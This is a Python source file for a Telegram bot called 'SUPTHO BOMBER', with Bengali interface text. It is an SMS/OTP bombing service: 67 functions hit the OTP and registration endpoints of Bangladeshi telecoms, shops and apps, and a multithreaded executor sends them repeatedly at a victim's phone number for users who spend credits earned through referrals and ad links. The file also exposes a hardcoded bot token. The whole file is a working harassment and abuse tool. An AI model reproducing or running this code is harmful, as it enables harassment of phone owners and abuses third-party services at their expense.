import telebot
import requests
import threading
import os
import json
import time
import random
import string
from concurrent.futures import ThreadPoolExecutor
from flask import Flask
from telebot import types

# ==========================================
# 🌐 WEB SERVER (Render Keep Alive)
# ==========================================
app = Flask('')
@app.route('/')
def home(): return "Supreme Bot is Online!"

def run_web_server():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    threading.Thread(target=run_web_server, daemon=True).start()

# ==========================================
# 🔧 CONFIGURATION
# ==========================================
API_TOKEN = '8577991344:AAFyp9TUo-BrzgUpO1ZRoy6fjnc41hBG4GM'  
OWNER_ID = 6941003064              # আপনার অ্যাডমিন আইডি
CHANNEL_ID = "@SH_tricks"         
DATA_FILE = 'supreme_db.json'
ADSTERRA_URL = "https://www.effectivegatecpm.com/wnbk2zjv?key=75442aee9e8b64a0d71c17a99228474d"

bot = telebot.TeleBot(API_TOKEN)

# Claim State Dictionary (Temporary Memory)
pending_claims = {}

# ==========================================
# 💾 DATABASE MANAGER
# ==========================================
def load_data():
    if not os.path.exists(DATA_FILE): return {"users": {}, "banned": []}
    try:
        with open(DATA_FILE, 'r') as f: return json.load(f)
    except: return {"users": {}, "banned": []}

def save_data(data):
    with open(DATA_FILE, 'w') as f: json.dump(data, f, indent=4)

db = load_data()

# ==========================================
# 🚀 API ENGINE (All 67 APIs)
# ==========================================
# (API ফাংশনগুলো অপরিবর্তিত রাখা হয়েছে, শুধু কল করা হবে)

def mygp_api(target):
    try: requests.get(f"https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn={target}&lang=en&ng=0", timeout=5)
    except: pass
def fundesh_get_api(target):
    try: requests.get(f"https://fundesh.com.bd/api/auth/generateOTP?service_key=&phone={target}", timeout=5)
    except: pass
def training_gov_api(target):
    try: requests.post("https://training.gov.bd/backoffice/api/user/sendOtp", json={"phone": target}, timeout=5)
    except: pass
def robi_da_api(target):
    try: requests.post("https://da-api.robi.com.bd/da-nll/otp/send", json={"msisdn": target}, timeout=5)
    except: pass
def easy_api(target):
    try: requests.post("https://core.easy.com.bd/api/v1/registration", json={"mobile": target}, timeout=5)
    except: pass
def etestpaper_api(target):
    try: requests.post("https://prod.etestpaper.net/api/auth/signup", json={"phone": target}, timeout=5)
    except: pass
def foodaholic_api(target):
    try: requests.post("https://foodaholic.com.bd/api/v1/auth/sign-up", json={"phone": target}, timeout=5)
    except: pass
def walton_api(target):
    try: requests.post("https://waltonplaza.com.bd/api/auth/otp/create", json={"phone": target}, timeout=5)
    except: pass
def foodcollections_api(target):
    try: requests.post("https://foodcollections.com/api/v1/auth/login", json={"phone": target}, timeout=5)
    except: pass
def chokrojan_api(target):
    try: requests.post("https://chokrojan.com/api/v1/passenger/login/mobile", json={"mobile_number": target}, timeout=5)
    except: pass
def proiojon_api(target):
    try: requests.post("https://billing.proiojon.com/api/v1/auth/login", json={"phone": target}, timeout=5)
    except: pass
def qcoom_api(target):
    try: requests.post("https://auth.qcoom.com/api/v1/otp/send", json={"mobileNumber": target}, timeout=5)
    except: pass
def pbs_api(target):
    try: requests.post("https://pbs.com.bd/login/?handler=UserGetOtp", data={"MobileNo": target}, timeout=5)
    except: pass
def shikho_api(target):
    try: requests.post("https://api.shikho.com/auth/v2/send/sms", json={"phone": target}, timeout=5)
    except: pass
def doctime_api(target):
    try: requests.post("https://api.doctime.com.bd/api/v2/authenticate", json={"contact_no": target}, timeout=5)
    except: pass
def kabbik_api(target):
    try: requests.post("https://api.kabbik.com/v1/auth/otpnew", json={"msisdn": target}, timeout=5)
    except: pass
def mbonline_api(target):
    try: requests.post("https://mbonlineapi.com/api/front/send/otp", json={"CellPhone": target}, timeout=5)
    except: pass
def sindabad_api(target):
    try: requests.post("https://offers.sindabad.com/api/mobile-otp", json={"mobile": target}, timeout=5)
    except: pass
def bl_eshop_api(target):
    try: requests.post("https://eshop-api.banglalink.net/api/v1/customer/send-otp", json={"phone": target}, timeout=5)
    except: pass
def lazzpharma_api(target):
    try: requests.post("https://www.lazzpharma.com/MessagingArea/OtpMessage/WebRegister", json={"Phone": target}, timeout=5)
    except: pass
def medha_api(target):
    try: requests.post("https://developer.medha.info/api/send-otp", json={"phone": target}, timeout=5)
    except: pass
def robi_web_api(target):
    try: requests.post("https://webloginda.robi.com.bd/backend/api/v1/otp", json={"phone_number": target}, timeout=5)
    except: pass
def ali2bd_api(target):
    try: requests.post("https://edge.ali2bd.com/api/consumer/v1/auth/login", json={"username": target}, timeout=5)
    except: pass
def chardike_api(target):
    try: requests.post("https://api.chardike.com/api/otp/send", json={"phone": target}, timeout=5)
    except: pass
def englishmoja_api(target):
    try: requests.post("https://api.englishmojabd.com/api/v1/auth/login", json={"phone": target}, timeout=5)
    except: pass
def gorillamove_api(target):
    try: requests.post("https://api.gorillamove.com/api/v1/core/account/phone_login", json={"phone_number": target}, timeout=5)
    except: pass
def manambd_api(target):
    try: requests.post("https://manambd.com/_public/api/send/otp", json={"mobile_no": target}, timeout=5)
    except: pass
def shwapno_api(target):
    try: requests.post("https://www.shwapno.com/api/auth", json={"phoneNumber": target}, timeout=5)
    except: pass
def ghoorilearning_api(target):
    try: requests.post("https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web&_lang=bn", json={"mobile_no": target}, timeout=5)
    except: pass
def moveon_api(target):
    try: requests.post("https://moveonbd.com/api/v1/customer/auth/phone/request-otp", json={"phone": target}, timeout=5)
    except: pass
def swap_v2_api(target):
    try: requests.post("https://api.swap.com.bd/api/v1/send-otp/v2", json={"phone": target}, timeout=5)
    except: pass
def arogga_api(target):
    try: requests.post("https://api.arogga.com/auth/v1/sms/send/?f=web&b=Chrome", data={"mobile": target}, timeout=5)
    except: pass
def binge_v3_api(target):
    try: requests.get(f"https://web-api.binge.buzz/api/v3/otp/send/{target}", timeout=5)
    except: pass
def khaasfood_api(target):
    try: requests.post("https://www.khaasfood.com/wp-admin/admin-ajax.php", data={"mobileNo": target}, timeout=5)
    except: pass
def rokomari_api(target):
    try: requests.post(f"https://www.rokomari.com/otp/send?emailOrPhone={target}&countryCode=BD", timeout=5)
    except: pass
def medeasy_api(target):
    try: requests.get(f"https://api.medeasy.health/api/send-otp/{target}/", timeout=5)
    except: pass
def xbet_api(target):
    try:
        url = "https://1x-bet.mobi/web-api/api/web/registration/v2/sms"
        headers = {"Host": "1x-bet.mobi", "content-type": "application/vnd.api+json", "x-hd": "B14yR/Fg66Wl0/6ZTsmYKoeGkgmwLECL3MM2GM3jBi+2FiS+iM7IvWFSiSGU/u4adW1hJw/IKAQwzORqWVY2XJiDW4bToG8r6rPlBaaW0pyv1pIvHdkJmr9hu85CeHXSWcV18ndxW8X+HQBXqCSTyeCY1IRYfh9H8X93xh27PdYZ+Pu4ziysYVaL3JM4cpJnO2D7Vdm30HnOgzotyrVO1p4s6SqDbhY16W6sMFKvNR+Eg/8PgmRmvVcT4WAHhHwClq+oCeTeOuDs1tZXe8uhmvurersqTzL7Pks49I5lz/o3BaN9OuOCawB9WwSXHHdxS5ThGldcgmA+K/2J8Kfgeu3x3GaJMn9elZJ1WCaJsHywDJGd2RnPzX7tTSP1rehzl1IRarlwHRgfW9XAshcsBWcFOP95REYoQnXEgQMXbnxwR7nIVjfJpR2nGpTWnDhj4RhVmCCe5aTaZvewBdbay5sopJMlLymIroFOvgF0FalrTVxNjHq/xitX8qY3L/Z53yoCO/SixhloKVMlrAyFZlGcFMEAi5/UnS1XhZucfkb5Ry3+l3pMIp9rAAs4MirnDWJFtQMZ0yoYTCa4ViM9Sp4j", "x-captcha-token": "SuuB2qKl4MBe2H5MsVcU+9+AAnMB3oohc0AwlQeVhEh+aAWaJTX5yFNx9OfZ+f19Lc9MhvmfnXX+9ToLpzodl3s7IQ2+YK5KLzD4iMD2jLbJieR9srEL3JqMjxgZ19JQ5ytxfn42pWEBnxIm3Csdys7YklzTpjF0ZKUTyYW3U3L6WKqyE8Y5cL/EAPZsWmK8Pv3cna1ugA3pBj8Y9SbRejdXo6bhp2OnNwZM2lkVt0wlTFQ0SyNsiTROxGWUlZB77+0xRW0XYbU9HoFLlzOdhwgppNfXDG+JKAsDTszVtvMoL0fUTByd/PlhCJPP7AzRiosyaBxWiwWRN4RCCWbHD1GXLm5HhOL+pXV8HyckwNx4gqLgrg==", "user-agent": "Mozilla/5.0", "origin": "https://1x-bet.mobi", "referer": "https://1x-bet.mobi/en/registration"}
        requests.post(url, json={"data":{"attributes":{"phone": target[-10:], "country_code": "880"}}}, headers=headers, timeout=5)
    except: pass
def gpfi_api(target):
    try: requests.post("https://gpfi-api.grameenphone.com/api/v1/fwa/request-for-otp", json={"phone": target}, timeout=5)
    except: pass
def chorcha_register_api(target):
    try: requests.post("https://mujib.chorcha.net/auth/register", json={"name": "User", "phone": target, "password": "Password123"}, timeout=5)
    except: pass
def beautybooth_api(target):
    try: requests.post("https://admin.beautybooth.com.bd/api/v2/auth/register", json={"value": target, "type": "phone"}, timeout=5)
    except: pass
def sailor_api(target):
    try: requests.post("https://backend.sailor.clothing/api/v2/auth/signup", json={"phone": target, "password": "Password123@"}, timeout=5)
    except: pass
def rangs_api(target):
    try: requests.post("https://ecom.rangs.com.bd/send-otp-code", json={"mobile": f"+88{target}"}, timeout=5)
    except: pass
def binge_api(target):
    try: requests.post("https://api.binge.buzz/api/v4/auth/otp/send", json={"phone": f"+88{target}"}, timeout=5)
    except: pass
def kfc_api(target):
    try: requests.post("https://kfcbd.com/livewire/message/home.login", json={"updates": [{"type":"syncInput","payload":{"name":"mobile","value": target}}]}, timeout=5)
    except: pass
def acs_api(target):
    try: requests.post("https://8t09wa0n0a.execute-api.ap-south-1.amazonaws.com/poc/api/v1/otp/send", json={"phone": target}, timeout=5)
    except: pass
def bdtickets_api(target):
    try: requests.post("https://api.bdtickets.com/v1/auth", json={"phoneNumber": f"+88{target}"}, timeout=5)
    except: pass
def robi_api(target):
    try: requests.post("https://www.robi.com.bd/bn", data=f'[{"{"}"msisdn":"{target}"{"}"}]', timeout=5)
    except: pass
def airtel_api(target):
    try: requests.post("https://www.bd.airtel.com/en", data=f'[{"{"}"msisdn":"{target}"{"}"}]', timeout=5)
    except: pass
def grameenphone_api(target):
    try: requests.post("https://webloginda.grameenphone.com/backend/api/v1/otp", data=f"msisdn={target}", timeout=5)
    except: pass
def apex_api(target):
    try: requests.post("https://api.apex4u.com/api/auth/login", json={"phoneNumber": target}, timeout=5)
    except: pass
def bikroy_api(target):
    try: requests.get(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={target}", timeout=5)
    except: pass
def banglalink_api(target):
    try: requests.post("https://web-api.banglalink.net/api/v1/user/otp-login/request", json={"mobile": target}, timeout=5)
    except: pass
def chorki_api(target):
    try: requests.post("https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web", json={"number": f"+88{target}"}, timeout=5)
    except: pass
def hoichoi_api(target):
    try: requests.post("https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code", json={"phoneNumber": f"+88{target}"}, timeout=5)
    except: pass
def bioscope_api(target):
    try: requests.post("https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web", json={"number": f"+88{target}"}, timeout=5)
    except: pass
def bohubrihi_api(target):
    try: requests.post("https://bb-api.bohubrihi.com/public/activity/otp", json={"phone": target}, timeout=5)
    except: pass
def ecourier_api(target):
    try: requests.get(f"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={target}", timeout=5)
    except: pass
def osudpotro_api(target):
    try: requests.post("https://api.osudpotro.com/api/v1/users/send_otp", json={"mobile": f"+88-{target}"}, timeout=5)
    except: pass
def fundesh_api(target):
    try: requests.post("https://fundesh.com.bd/api/auth/resendOTP", json={"msisdn": target[-10:]}, timeout=5)
    except: pass
def paperfly_api(target):
    try: requests.post("https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", json={"phone_number": target}, timeout=5)
    except: pass
def sundarban_api(target):
    try: requests.post("https://api-gateway.sundarbancourierltd.com/graphql", json={"variables": {"accessTokenFilter": {"userName": target}}}, timeout=5)
    except: pass
def hishabee_api(target):
    try: requests.post(f"https://app.hishabee.business/api/V2/otp/send?mobile_number={target}", timeout=5)
    except: pass
def shomvob_api(target):
    try: requests.post("https://backend-api.shomvob.co/api/v2/otp/phone", json={"phone": f"88{target}"}, timeout=5)
    except: pass
def deeptoplay_api(target):
    try: requests.post("https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web", json={"number": f"+88{target}"}, timeout=5)
    except: pass
def redx_api(target):
    try: requests.post("https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", json={"phoneNumber": target}, timeout=5)
    except: pass
def cokestudio_api(target):
    try: requests.post("https://cokestudio23.sslwireless.com/api/store-and-send-otp", json={"msisdn": "880" + target[-10:]}, timeout=5)
    except: pass
def swap_api(target):
    try: requests.post("https://api.swap.com.bd/api/v1/send-otp", json={"phone": "0" + target[-10:]}, timeout=5)
    except: pass
def prothomalo_api(target):
    try: requests.post("https://prod-api.viewlift.com/identity/signup?site=prothomalo", json={"phoneNumber": "+880" + target[-10:]}, timeout=5)
    except: pass

def attack_executor(target, amount):
    apis = [mygp_api, fundesh_get_api, training_gov_api, robi_da_api, easy_api, etestpaper_api, foodaholic_api, walton_api, foodcollections_api, chokrojan_api, proiojon_api, qcoom_api, pbs_api, shikho_api, doctime_api, kabbik_api, mbonline_api, sindabad_api, bl_eshop_api, lazzpharma_api, medha_api, robi_web_api, ali2bd_api, chardike_api, englishmoja_api, gorillamove_api, manambd_api, shwapno_api, ghoorilearning_api, moveon_api, swap_v2_api, arogga_api, binge_v3_api, khaasfood_api, rokomari_api, medeasy_api, xbet_api, gpfi_api, chorcha_register_api, beautybooth_api, sailor_api, rangs_api, binge_api, kfc_api, acs_api, bdtickets_api, robi_api, grameenphone_api, apex_api, bikroy_api, banglalink_api, airtel_api, chorki_api, hoichoi_api, bioscope_api, bohubrihi_api, ecourier_api, osudpotro_api, fundesh_api, paperfly_api, sundarban_api, hishabee_api, shomvob_api, deeptoplay_api, redx_api, cokestudio_api, swap_api, prothomalo_api]
    
    with ThreadPoolExecutor(max_workers=100) as executor:
        for _ in range(amount):
            for run_api in apis:
                executor.submit(run_api, target)
                executor.submit(run_api, target)

# ==========================================
# 🤖 BOT LOGIC
# ==========================================

def is_joined(user_id):
    if int(user_id) == OWNER_ID: return True
    try:
        member = bot.get_chat_member(CHANNEL_ID, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except: return False

@bot.message_handler(commands=['start'])
def welcome(message):
    uid = str(message.from_user.id)
    args = message.text.split()
    
    if uid not in db['users']: 
        db['users'][uid] = {"credits": 0, "plan": "free"}
        if len(args) > 1 and args[1] in db['users'] and args[1] != uid:
            db['users'][args[1]]['credits'] += 5
            try: bot.send_message(args[1], "🎉 কেউ আপনার লিঙ্কে জয়েন করেছে! +5 ক্রেডিট।")
            except: pass
        save_data(db)
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("🚀 Start Bomb", "👤 Profile", "💎 Get Free Credits", "👥 Refer & Earn")
    bot.send_message(message.chat.id, "🔥 **SUPTHO BOMBER** 🔥", reply_markup=markup)

@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if message.from_user.id != OWNER_ID: return
    bot.reply_to(message, "👑 **ADMIN PANEL**\n\n/stats - দেখুন কতজন ইউজার\n/broadcast <msg> - সবাইকে মেসেজ দিন")

@bot.message_handler(func=lambda m: True)
def menu_logic(message):
    uid = str(message.from_user.id)
    
    if not is_joined(uid):
        btn = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("Join Channel 📢", url=f"https://t.me/{CHANNEL_ID.replace('@','')}"))
        return bot.reply_to(message, "❌ আগে চ্যানেলে জয়েন করুন!", reply_markup=btn)

    if message.text == "🚀 Start Bomb":
        msg = bot.reply_to(message, "💣 টার্গেট নাম্বার দিন:")
        bot.register_next_step_handler(msg, ask_amount)
    
    elif message.text == "👤 Profile":
        u = db['users'].get(uid, {})
        cred = "Unlimited" if int(uid) == OWNER_ID or u.get('plan') == 'vip' else u.get('credits', 0)
        bot.reply_to(message, f"👤 **PROFILE**\n\n🆔 ID: `{uid}`\n💰 Balance: `{cred}`")

    elif message.text == "💎 Get Free Credits":
        pending_claims[uid] = time.time()  # Store click time
        
        btn = types.InlineKeyboardMarkup()
        btn.add(types.InlineKeyboardButton("🔗 Open Link & Wait 10s", url=ADSTERRA_URL))
        btn.add(types.InlineKeyboardButton("✅ Claim 5 Credits", callback_data="claim_credit"))
        
        text = "⚠️ **নিয়মাবলী:**\n\n১. নিচের লিংকে ক্লিক করে **১০ সেকেন্ড** অপেক্ষা করুন।\n২. ফিরে এসে আরও **১০ সেকেন্ড** অপেক্ষা করুন।\n৩. মোট ২০ সেকেন্ড পর 'Claim' বাটনে চাপ দিন।\n\n❌ **নোট:** এর আগে ক্লিক করলে কাজ হবে না!"
        bot.reply_to(message, text, reply_markup=btn)

    elif message.text == "👥 Refer & Earn":
        link = f"https://t.me/{bot.get_me().username}?start={uid}"
        bot.reply_to(message, f"🎁 রেফার লিঙ্ক:\n`{link}`\n\nপ্রতি রেফারে ৫ ক্রেডিট।")

@bot.callback_query_handler(func=lambda call: call.data == "claim_credit")
def claim_reward(call):
    uid = str(call.from_user.id)
    start_time = pending_claims.get(uid, 0)
    elapsed = time.time() - start_time
    
    if elapsed >= 20: # 20 Seconds Check (10s ad + 10s wait)
        db['users'][uid]['credits'] += 5
        save_data(db)
        del pending_claims[uid]
        bot.answer_callback_query(call.id, "✅ Success! 5 Credits Added.")
        bot.edit_message_text(f"🎉 **অভিনন্দন!**\n৫ ক্রেডিট যোগ করা হয়েছে।\nবর্তমান ব্যালেন্স: {db['users'][uid]['credits']}", call.message.chat.id, call.message.message_id)
    else:
        wait_more = int(20 - elapsed)
        bot.answer_callback_query(call.id, f"❌ আরও {wait_more} সেকেন্ড অপেক্ষা করুন!", show_alert=True)

def ask_amount(message):
    target = message.text
    msg = bot.reply_to(message, "🔢 কত রাউন্ড?")
    bot.register_next_step_handler(msg, process_bomb, target)

def process_bomb(message, target):
    uid = str(message.from_user.id)
    u_data = db['users'].get(uid, {})
    try:
        amount = int(message.text)
        if int(uid) != OWNER_ID and u_data.get('plan') != 'vip':
            if u_data['credits'] < 1: return bot.reply_to(message, "⚠️ ক্রেডিট নেই! 'Get Free Credits' ব্যবহার করুন।")
            db['users'][uid]['credits'] -= 1; save_data(db)
        
        bot.reply_to(message, f"🚀 {target} নাম্বারে ডাবল স্পিডে বোম্বিং শুরু হয়েছে!")
        threading.Thread(target=attack_executor, args=(target, amount)).start()
    except: bot.reply_to(message, "❌ ভুল ইনপুট!")

if __name__ == "__main__":
    keep_alive()
    try:
        bot.remove_webhook()
    except: pass
    bot.polling(non_stop=True)
